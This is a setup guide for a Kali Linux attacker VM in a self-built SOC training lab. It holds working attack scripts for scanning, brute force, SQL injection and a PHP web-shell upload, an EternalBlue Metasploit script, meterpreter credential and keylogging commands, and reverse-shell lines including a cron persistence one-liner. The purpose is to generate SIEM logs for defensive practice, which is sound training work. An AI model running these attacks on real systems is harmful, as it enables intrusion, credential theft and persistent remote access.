# Kali Linux Attacker VM - ATTACKER

## VM Specifications
- **OS**: Kali Linux 2023.4 (64-bit)
- **RAM**: 4GB (minimum), 8GB (recommended)
- **Storage**: 50GB
- **Network**: NAT Network (SOC-Lab-Network)
- **CPU**: 2 cores
- **IP Address**: 192.168.1.50 (static)
- **Hostname**: kali-attacker

## Purpose
This VM serves as the attacker machine for practicing:
- Network reconnaissance
- Vulnerability scanning
- Exploitation techniques
- Post-exploitation activities
- Lateral movement
- Data exfiltration
- Generating realistic attack logs for SIEM analysis

## VirtualBox Configuration

### Create VM via VBoxManage
```bash
# Create VM
VBoxManage createvm --name "KALI-ATTACKER" --ostype "Debian_64" --register

# Configure VM
VBoxManage modifyvm "KALI-ATTACKER" --memory 4096 --cpus 2
VBoxManage modifyvm "KALI-ATTACKER" --vram 128
VBoxManage modifyvm "KALI-ATTACKER" --nic1 natnetwork --nat-network1 "SOC-Lab-Network"
VBoxManage modifyvm "KALI-ATTACKER" --audio none
VBoxManage modifyvm "KALI-ATTACKER" --clipboard bidirectional
VBoxManage modifyvm "KALI-ATTACKER" --draganddrop bidirectional

# Create and attach storage
VBoxManage createhd --filename "KALI-ATTACKER.vdi" --size 51200
VBoxManage storagectl "KALI-ATTACKER" --name "SATA Controller" --add sata --controller IntelAHCI
VBoxManage storageattach "KALI-ATTACKER" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium "KALI-ATTACKER.vdi"
VBoxManage storageattach "KALI-ATTACKER" --storagectl "SATA Controller" --port 1 --device 0 --type dvddrive --medium "kali-linux-2023.4-installer-amd64.iso"
```

## Kali Linux Installation

1. Start the VM and install Kali Linux
2. Installation options:
   - **Hostname**: kali-attacker
   - **Username**: kali
   - **Password**: kali
   - **Desktop Environment**: XFCE (recommended for performance)
   - **Installation Type**: Default (includes all tools)

## Post-Installation Configuration

### 1. Initial System Setup

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install additional tools
sudo apt install -y git curl wget vim htop net-tools dnsutils

# Update Kali tools
sudo apt install -y kali-tools-top10
```

### 2. Configure Static IP

```bash
# Edit network interfaces
sudo tee /etc/network/interfaces.d/eth0 > /dev/null <<'EOF'
auto eth0
iface eth0 inet static
    address 192.168.1.50
    netmask 255.255.255.0
    gateway 192.168.1.1
    dns-nameservers 192.168.1.10 8.8.8.8
EOF

# Restart networking
sudo systemctl restart networking

# Verify
ip addr show eth0
```

Alternative using Network Manager:
```bash
# Using nmcli
sudo nmcli connection modify "Wired connection 1" ipv4.addresses "192.168.1.50/24"
sudo nmcli connection modify "Wired connection 1" ipv4.gateway "192.168.1.1"
sudo nmcli connection modify "Wired connection 1" ipv4.dns "192.168.1.10 8.8.8.8"
sudo nmcli connection modify "Wired connection 1" ipv4.method manual
sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
```

### 3. Set Hostname

```bash
# Set hostname
sudo hostnamectl set-hostname kali-attacker

# Update hosts file
sudo tee /etc/hosts > /dev/null <<'EOF'
127.0.0.1       localhost
127.0.1.1       kali-attacker
192.168.1.10    soc-dc1 soclab.local
192.168.1.20    siem-elk
192.168.1.30    win10-vuln
192.168.1.40    ubuntu-vuln
192.168.1.50    kali-attacker
EOF
```

### 4. Install Essential Pentesting Tools

```bash
# Reconnaissance tools
sudo apt install -y nmap netdiscover masscan

# Web application testing
sudo apt install -y burpsuite zaproxy sqlmap nikto dirb gobuster

# Exploitation frameworks
sudo apt install -y metasploit-framework exploitdb

# Password cracking
sudo apt install -y john hashcat hydra medusa

# Network analysis
sudo apt install -y wireshark tcpdump ettercap-text-only

# Post-exploitation
sudo apt install -y powercat powersploit mimikatz

# Additional tools
sudo apt install -y smbclient enum4linux rpcclient

# Update Metasploit database
sudo msfdb init
```

### 5. Configure Metasploit Framework

```bash
# Start PostgreSQL
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Initialize Metasploit database
sudo msfdb init

# Start Metasploit
sudo msfconsole -q << 'EOF'
db_status
workspace -a soc-lab
exit
EOF
```

### 6. Create Attack Scripts Directory

```bash
# Create organized directory structure
mkdir -p ~/attack-scripts/{recon,exploit,post-exploit,wordlists}

# Create attack log directory
mkdir -p ~/attack-logs
```

## SOC Lab Attack Toolkit

### 1. Network Reconnaissance Script

```bash
# Create reconnaissance script
tee ~/attack-scripts/recon/lab-recon.sh > /dev/null <<'EOF'
#!/bin/bash

# SOC Lab Network Reconnaissance
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_recon
mkdir -p $OUTPUT_DIR

echo "[*] Starting SOC Lab Reconnaissance"
echo "[*] Output directory: $OUTPUT_DIR"

# Network discovery
echo "[*] Discovering live hosts..."
nmap -sn 192.168.1.0/24 -oN $OUTPUT_DIR/host-discovery.txt

# Port scanning
echo "[*] Scanning Domain Controller (192.168.1.10)..."
nmap -sV -sC -p- 192.168.1.10 -oN $OUTPUT_DIR/dc-scan.txt

echo "[*] Scanning SIEM Server (192.168.1.20)..."
nmap -sV -sC -p- 192.168.1.20 -oN $OUTPUT_DIR/siem-scan.txt

echo "[*] Scanning Windows 10 (192.168.1.30)..."
nmap -sV -sC -p- 192.168.1.30 -oN $OUTPUT_DIR/win10-scan.txt

echo "[*] Scanning Ubuntu Server (192.168.1.40)..."
nmap -sV -sC -p- 192.168.1.40 -oN $OUTPUT_DIR/ubuntu-scan.txt

# SMB enumeration
echo "[*] Enumerating SMB shares..."
enum4linux -a 192.168.1.10 > $OUTPUT_DIR/dc-enum4linux.txt
enum4linux -a 192.168.1.30 > $OUTPUT_DIR/win10-enum4linux.txt

# Web service enumeration
echo "[*] Scanning web services..."
nikto -h http://192.168.1.20:5601 -o $OUTPUT_DIR/kibana-nikto.txt
nikto -h http://192.168.1.40 -o $OUTPUT_DIR/ubuntu-web-nikto.txt

echo "[+] Reconnaissance complete! Check $OUTPUT_DIR"
EOF

chmod +x ~/attack-scripts/recon/lab-recon.sh
```

### 2. SSH Brute Force Script

```bash
tee ~/attack-scripts/exploit/ssh-bruteforce.sh > /dev/null <<'EOF'
#!/bin/bash

# SSH Brute Force Attack
TARGET=$1
USERNAME=$2
WORDLIST=${3:-/usr/share/wordlists/rockyou.txt}
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_ssh-brute
mkdir -p $OUTPUT_DIR

if [ -z "$TARGET" ] || [ -z "$USERNAME" ]; then
    echo "Usage: $0 <target_ip> <username> [wordlist]"
    echo "Example: $0 192.168.1.40 admin"
    exit 1
fi

echo "[*] Starting SSH brute force attack"
echo "[*] Target: $TARGET"
echo "[*] Username: $USERNAME"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Output: $OUTPUT_DIR"

# Check if wordlist is compressed
if [[ $WORDLIST == *.gz ]]; then
    echo "[*] Decompressing wordlist..."
    TEMP_WORDLIST=/tmp/wordlist.txt
    gunzip -c $WORDLIST > $TEMP_WORDLIST
    WORDLIST=$TEMP_WORDLIST
fi

# Run hydra
hydra -l $USERNAME -P $WORDLIST -t 4 ssh://$TARGET -o $OUTPUT_DIR/results.txt

echo "[+] Attack complete! Check $OUTPUT_DIR/results.txt"
EOF

chmod +x ~/attack-scripts/exploit/ssh-bruteforce.sh
```

### 3. Web Application Attack Script

```bash
tee ~/attack-scripts/exploit/web-attacks.sh > /dev/null <<'EOF'
#!/bin/bash

# Web Application Attack Suite
TARGET=${1:-192.168.1.40}
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_web-attacks
mkdir -p $OUTPUT_DIR

echo "[*] Starting web application attacks against $TARGET"

# Directory enumeration
echo "[*] Directory enumeration..."
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/directories.txt

# SQL Injection tests
echo "[*] Testing SQL injection..."
sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=test" \
  --batch --dbs -o $OUTPUT_DIR/sqlmap.txt

# XSS testing
echo "[*] Testing XSS..."
curl "http://$TARGET/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -o $OUTPUT_DIR/xss-test.html

# File upload test
echo "[*] Testing file upload..."
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -F "fileToUpload=@/tmp/shell.php" http://$TARGET/uploads/index.php \
  -o $OUTPUT_DIR/upload-result.txt

echo "[+] Web attacks complete! Check $OUTPUT_DIR"
EOF

chmod +x ~/attack-scripts/exploit/web-attacks.sh
```

### 4. RDP Brute Force Script

```bash
tee ~/attack-scripts/exploit/rdp-bruteforce.sh > /dev/null <<'EOF'
#!/bin/bash

# RDP Brute Force Attack
TARGET=${1:-192.168.1.30}
USERNAME=${2:-admin}
WORDLIST=${3:-/usr/share/wordlists/metasploit/unix_passwords.txt}
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_rdp-brute
mkdir -p $OUTPUT_DIR

echo "[*] Starting RDP brute force attack"
echo "[*] Target: $TARGET"
echo "[*] Username: $USERNAME"

# Using hydra
hydra -l $USERNAME -P $WORDLIST -t 4 rdp://$TARGET -o $OUTPUT_DIR/results.txt

echo "[+] Attack complete! Check $OUTPUT_DIR/results.txt"
EOF

chmod +x ~/attack-scripts/exploit/rdp-bruteforce.sh
```

### 5. Metasploit Automation Script

```bash
tee ~/attack-scripts/exploit/msf-eternal-blue.rc > /dev/null <<'EOF'
# Metasploit EternalBlue Exploit Script
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.30
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
EOF

# Create launch script
tee ~/attack-scripts/exploit/run-eternalblue.sh > /dev/null <<'EOF'
#!/bin/bash
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_eternalblue
mkdir -p $OUTPUT_DIR

echo "[*] Launching EternalBlue exploit"
msfconsole -r ~/attack-scripts/exploit/msf-eternal-blue.rc | tee $OUTPUT_DIR/exploit-log.txt
EOF

chmod +x ~/attack-scripts/exploit/run-eternalblue.sh
```

### 6. Post-Exploitation Script

```bash
tee ~/attack-scripts/post-exploit/data-exfil.sh > /dev/null <<'EOF'
#!/bin/bash

# Simulated Data Exfiltration
TARGET=$1
METHOD=${2:-http}
OUTPUT_DIR=~/attack-logs/$(date +%Y%m%d_%H%M%S)_exfil
mkdir -p $OUTPUT_DIR

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [method: http|ftp|dns]"
    exit 1
fi

echo "[*] Simulating data exfiltration from $TARGET"
echo "[*] Method: $METHOD"

case $METHOD in
    http)
        # HTTP exfiltration simulation
        echo "[*] Setting up HTTP listener on port 8000..."
        python3 -m http.server 8000 &
        SERVER_PID=$!
        
        echo "[*] Simulate file transfer from target"
        # Would execute on target: curl -F "file=@sensitive_data.txt" http://192.168.1.50:8000/upload
        
        sleep 30
        kill $SERVER_PID
        ;;
    ftp)
        echo "[*] FTP exfiltration simulation..."
        # Configure FTP server
        ;;
    dns)
        echo "[*] DNS exfiltration simulation..."
        # DNS tunneling
        ;;
esac

echo "[+] Exfiltration simulation complete!"
EOF

chmod +x ~/attack-scripts/post-exploit/data-exfil.sh
```

## Attack Scenarios with Log Generation

### Scenario 1: Initial Access - SSH Brute Force

```bash
# This will generate authentication logs on the target
~/attack-scripts/exploit/ssh-bruteforce.sh 192.168.1.40 admin

# Check SIEM for Event Correlation:
# - Failed SSH authentication attempts
# - Source IP: 192.168.1.50
# - Multiple failed attempts from same source
# - Time-based patterns
```

### Scenario 2: Web Application Exploitation

```bash
# Directory enumeration and SQL injection
~/attack-scripts/exploit/web-attacks.sh 192.168.1.40

# Check SIEM for:
# - 404 errors (directory enumeration)
# - SQL injection patterns in web logs
# - Abnormal HTTP request patterns
# - File upload attempts
```

### Scenario 3: Network Reconnaissance

```bash
# Full network scan
~/attack-scripts/recon/lab-recon.sh

# Check SIEM for:
# - Port scanning activity
# - Connection attempts to multiple ports
# - SMB enumeration
# - Service version detection
```

### Scenario 4: Lateral Movement

```bash
# RDP brute force after SSH compromise
~/attack-scripts/exploit/rdp-bruteforce.sh 192.168.1.30 Administrator

# Check SIEM for:
# - RDP authentication failures (Event ID 4625)
# - Lateral movement indicators
# - Account login from unusual source
```

## Quick Attack Commands

### Network Scanning
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Full port scan
nmap -p- -T4 192.168.1.30

# Service version detection
nmap -sV 192.168.1.40

# Vulnerability scanning
nmap --script vuln 192.168.1.30
```

### Password Attacks
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.40

# RDP brute force
hydra -l Administrator -P passwords.txt rdp://192.168.1.30

# SMB brute force
hydra -l admin -P passwords.txt smb://192.168.1.30
```

### Web Application Testing
```bash
# Directory enumeration
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirb/common.txt

# SQL injection
sqlmap -u "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1" --dbs

# Nikto scan
nikto -h http://192.168.1.40
```

### Exploitation
```bash
# Metasploit console
msfconsole

# Search for exploits
msf6 > search eternalblue

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.30
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit
```

### Post-Exploitation
```bash
# After getting meterpreter session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > ps
meterpreter > migrate <PID>
```

## Traffic Capture for Analysis

### Capture Attack Traffic

```bash
# Start packet capture
sudo tcpdump -i eth0 -w ~/attack-logs/attack-traffic-$(date +%Y%m%d_%H%M%S).pcap

# Or use Wireshark
sudo wireshark &
```

## Lab Targets Quick Reference

### Domain Controller (192.168.1.10)
- **OS**: Windows Server 2019
- **Services**: AD, DNS, DHCP, SMB
- **Test**: AD enumeration, Kerberoasting, SMB relay

### SIEM Server (192.168.1.20)
- **OS**: Ubuntu Server 22.04
- **Services**: ELK Stack (9200, 5601), Suricata
- **Test**: (Do not attack - monitoring only)

### Windows 10 Vulnerable (192.168.1.30)
- **OS**: Windows 10 Pro
- **Services**: RDP (3389), SMB (445), WinRM (5985)
- **Credentials**: socuser:Password123!, admin:admin
- **Test**: RDP brute force, SMB exploits, EternalBlue

### Ubuntu Vulnerable (192.168.1.40)
- **OS**: Ubuntu Server 20.04
- **Services**: SSH (22), HTTP (80), FTP (21), MySQL (3306)
- **Credentials**: admin:admin, test:test, root:toor
- **Test**: SSH brute force, web attacks, SQL injection

## Attack Chain Examples

### Example 1: Complete Attack Chain

```bash
# 1. Reconnaissance
nmap -sV -sC -p- 192.168.1.40

# 2. Vulnerability scanning
nikto -h http://192.168.1.40

# 3. Exploitation (SSH brute force)
hydra -l admin -P small-wordlist.txt ssh://192.168.1.40

# 4. Access gained - establish persistence
ssh admin@192.168.1.40
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" | crontab -

# 5. Lateral movement
nmap -p 3389 192.168.1.30
rdesktop 192.168.1.30

# 6. Data exfiltration
scp sensitive-data.tar.gz kali@192.168.1.50:/tmp/
```

### Example 2: Web Application Attack Chain

```bash
# 1. Directory enumeration
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirb/common.txt

# 2. Find DVWA
firefox http://192.168.1.40/dvwa/

# 3. SQL injection
sqlmap -u "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1" --dump

# 4. Upload web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload via vulnerable upload form

# 5. Execute commands
curl "http://192.168.1.40/uploads/shell.php?cmd=whoami"

# 6. Reverse shell
curl "http://192.168.1.40/uploads/shell.php?cmd=bash+-c+'bash+-i+>&+/dev/tcp/192.168.1.50/4444+0>&1'"
```

## Detection Testing

### Generate Specific SIEM Alerts

```bash
# Generate brute force alert
for i in {1..10}; do
  ssh wronguser@192.168.1.40
done

# Generate web attack alert
curl "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1"

# Generate scan alert
nmap -sS 192.168.1.0/24

# Generate file upload alert
curl -F "fileToUpload=@malware.exe" http://192.168.1.40/uploads/
```

## Wordlists and Resources

### Common Wordlist Locations
```bash
# Passwords
/usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/metasploit/
/usr/share/seclists/Passwords/

# Directories
/usr/share/wordlists/dirb/
/usr/share/wordlists/dirbuster/

# Usernames
/usr/share/seclists/Usernames/

# Extract rockyou
gunzip /usr/share/wordlists/rockyou.txt.gz
```

## Safety and Best Practices

### ⚠️ Important Rules

1. **ONLY attack lab targets**:
   - 192.168.1.10 (Domain Controller)
   - 192.168.1.30 (Windows 10)
   - 192.168.1.40 (Ubuntu Server)

2. **DO NOT attack**:
   - 192.168.1.20 (SIEM - monitoring only)
   - Any external network
   - Internet-facing systems

3. **Always check network isolation**:
```bash
# Verify you're on the lab network
ip addr show
# Should show 192.168.1.50

# Test isolation
ping -c 1 8.8.8.8
# Should fail or be firewalled
```

4. **Document all activities**:
   - Log all attacks
   - Note timestamps
   - Record successful exploits
   - Save all evidence

## Maintenance Scripts

### Daily Lab Attack Routine

```bash
tee ~/attack-scripts/daily-routine.sh > /dev/null <<'EOF'
#!/bin/bash

echo "[*] SOC Lab Daily Attack Routine"
echo "[*] Date: $(date)"

# 1. Network reconnaissance
echo "[*] Phase 1: Reconnaissance"
nmap -sn 192.168.1.0/24

# 2. SSH brute force
echo "[*] Phase 2: SSH Attacks"
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.40 -t 4

# 3. Web attacks
echo "[*] Phase 3: Web Attacks"
curl "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1"

# 4. RDP attempts
echo "[*] Phase 4: RDP Attacks"
hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt rdp://192.168.1.30 -t 2

echo "[+] Daily routine complete"
echo "[*] Check SIEM dashboard at http://192.168.1.20:5601"
EOF

chmod +x ~/attack-scripts/daily-routine.sh
```

## Troubleshooting

### Network Connectivity Issues

```bash
# Check IP configuration
ip addr show

# Test connectivity to targets
ping -c 3 192.168.1.10
ping -c 3 192.168.1.20
ping -c 3 192.168.1.30
ping -c 3 192.168.1.40

# Check routing
ip route show

# DNS resolution
nslookup soc-dc1 192.168.1.10
```

### Tool Issues

```bash
# Update Metasploit
sudo msfupdate

# Update tools
sudo apt update && sudo apt upgrade -y

# Reinstall tool
sudo apt install --reinstall <tool-name>
```

## Snapshots

```bash
# Clean state
VBoxManage snapshot "KALI-ATTACKER" take "Clean-Setup" --description "Fresh Kali with all tools"

# Before major attack
VBoxManage snapshot "KALI-ATTACKER" take "Pre-Attack-$(date +%Y%m%d)" --description "Before attack campaign"
```

## Quick Reference Card

### Essential Commands
```bash
# Scan network
nmap -sn 192.168.1.0/24

# Port scan
nmap -p- 192.168.1.30

# SSH brute force
hydra -l admin -P wordlist.txt ssh://192.168.1.40

# Web directory scan
gobuster dir -u http://192.168.1.40 -w /usr/share/wordlists/dirb/common.txt

# SQL injection
sqlmap -u "http://192.168.1.40/dvwa/vulnerabilities/sqli/?id=1" --dbs

# Metasploit
msfconsole
```

### Default Credentials to Test
- admin:admin
- test:test
- root:toor
- socuser:Password123!

### Important IPs
- DC: 192.168.1.10
- SIEM: 192.168.1.20 (Kibana: http://192.168.1.20:5601)
- Win10: 192.168.1.30
- Ubuntu: 192.168.1.40
- Attacker (you): 192.168.1.50

## Learning Objectives

After using this VM, you will be able to:
- ✅ Perform network reconnaissance
- ✅ Execute various attack techniques
- ✅ Generate realistic attack logs
- ✅ Understand how attacks appear in SIEM
- ✅ Correlate attack activities with log events
- ✅ Practice incident response from attacker perspective
- ✅ Understand attacker TTP (Tactics, Techniques, Procedures)

## References

- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
